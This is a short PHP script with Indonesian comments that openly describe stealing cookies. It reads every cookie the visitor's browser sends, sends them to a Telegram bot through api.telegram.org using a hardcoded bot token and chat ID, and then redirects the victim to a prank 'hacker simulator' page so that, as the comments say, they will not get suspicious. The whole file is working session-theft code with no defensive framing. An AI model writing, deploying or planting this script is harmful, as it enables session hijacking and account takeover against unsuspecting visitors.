<?php
// Mencuri semua cookie
$cookies = $_SERVER['HTTP_COOKIE'];

// Kirimkan cookie yang dicuri ke bot Telegram
$telegram_bot_token = "6770538717:AAErFfDU4YPi8ZI_DicvTxNVFqciSVKghdw";
$chat_id = "6770538717";
$message = "Cookies yang berhasil dicuri: \n" . $cookies;

// Kirim pesan ke bot Telegram
$telegram_url = "https://api.telegram.org/bot" . $telegram_bot_token . "/sendMessage?chat_id=" . $chat_id . "&text=" . urlencode($message);
file_get_contents($telegram_url);

// Redirect pengguna ke situs lain agar tidak curiga
header("Location: https://pranx.com/hacker/simulateur/");
?>
